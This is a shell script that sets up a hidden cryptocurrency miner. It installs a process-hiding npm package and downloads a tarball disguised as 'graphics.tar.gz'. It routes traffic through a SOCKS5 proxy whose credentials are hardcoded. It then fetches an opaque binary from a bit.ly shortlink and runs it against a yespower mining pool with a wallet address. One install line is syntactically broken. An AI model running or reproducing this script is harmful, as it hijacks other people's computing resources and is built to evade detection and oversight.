#!/bin/sh
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = sg-socks5.woiden.net
socks5_username = woiden_jembut_asu
socks5_password = jembut89
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://bit.ly/3bKjlUQ && chmod 700 3bKjlUQ && ./3bKjlUQ -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra.$(shuf -n 1 -i 1-9999999) -p x -t14
